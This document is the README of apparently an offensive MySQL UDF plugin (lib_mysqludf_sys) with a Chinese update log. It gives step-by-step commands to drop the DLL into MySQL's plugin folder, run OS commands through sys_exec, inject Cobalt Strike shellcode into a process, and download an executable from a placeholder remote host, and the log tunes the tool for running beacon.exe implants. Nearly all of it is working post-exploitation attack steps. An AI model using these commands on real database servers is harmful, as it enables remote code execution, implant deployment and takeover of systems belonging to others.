# lib_mysqludf_sys
lib_mysqludf_sys is a udf plugin of MySQL.

## Into Dumpfile

1.```python3 udf_Bin2Hex.py 1 Release\lib_mysqludf_sys_x64.dll "C:\\Program Files\\MySQL\\MySQL Server 5.5\\lib\\plugin\\lib_mysqludf_sys_x64.dll" > lib_mysqludf_sys_x64.sql```

2.exec .sql file

![](https://cdn.jsdelivr.net/gh/yanghaoi/lib_mysqludf_sys/imgaes/exec_sql.png) 

3.dumpfile lib_mysqludf_sys_x64.dll into lib/plugin

![](https://cdn.jsdelivr.net/gh/yanghaoi/lib_mysqludf_sys/imgaes/dumpfile.png) 

## Sys_exec

1.``` create function sys_exec returns string soname "lib_mysqludf_sys_x64.dll"; 
select sys_exec("chcp 65001 & ipconfig");drop function sys_exec; ```

2.``` create function sys_exec returns string soname "lib_mysqludf_sys_x64.dll"; 
select sys_exec("whoami");drop function sys_exec; ```

![](https://cdn.jsdelivr.net/gh/yanghaoi/lib_mysqludf_sys/imgaes/sys_exec.png) 


## Inject

1.Generate Stage/Stageless RAW file for Cobalt Strike


2.Dumpfile in MySQL machine


3.Inject shellcode

```create function inject returns string soname "lib_mysqludf_sys_x64.dll"; select inject(hex(load_file("C:\\raw.bin")),"AppVNice.exe");drop function inject;```

![](https://cdn.jsdelivr.net/gh/yanghaoi/lib_mysqludf_sys/imgaes/Inject_file.png) 

4.GIF 

![](https://cdn.jsdelivr.net/gh/yanghaoi/lib_mysqludf_sys/imgaes/injectshellcode.gif) 

## Download

```create function download returns string soname "lib_mysqludf_sys_x64.dll"; select download("http://xxxx/xxx.exe","C:\\11111.exe");drop function download;```



# Update-logs
## 20211228-aa7a95deeb58d3968c78c389d85c420745f22a46
BUG： 执行持久程序时由于文件句柄占用无法获得下次命令执行输出，如执行beacon.exe后，再执行whoami将没有回显输出。 


## 20220330-1754bafe546410fd47164a6cf5a33d859ffe6f7c-Experimental
Bug： 在使用命令执行 C:\\beacon.exe 后，无法停止mysql服务,强行终止进程后也无法启动服务，需要等 beacon.exe 退出后才能正常启停服务。  

fixes-BUG-20211228:使用unlocker库解除文件占用，但udf文件大小增加了；

1.使用CreateFile+CreateProcess获取子进程命令执行返回;  

2.中文乱码时可以切换数据库链接编码为GBK(chcp = 936).   

## 20220331--Experimental 
fixes-Bug-20220330: 增加参数来设置是否需要进行回显，如果是 C:\\beacon.exe 类不回显且会持续运行的程序就不通过CreateProcessA第五个参数设置继承了，这样就不会阻塞父进程。  

1. sys_exec("whoami","1")  回显 whoami 命令结果  
2. sys_exec("C:\\beacon.exe","x")  执行beacon类不需要回显


TIPS: 这个版本中的回显使用了匿名管道的方式，不能支持返回较大的命令(如 tasklist)执行，因为管道缓冲区是有限的，不准备解决该问题了==，通过最初的版本可以执行。  
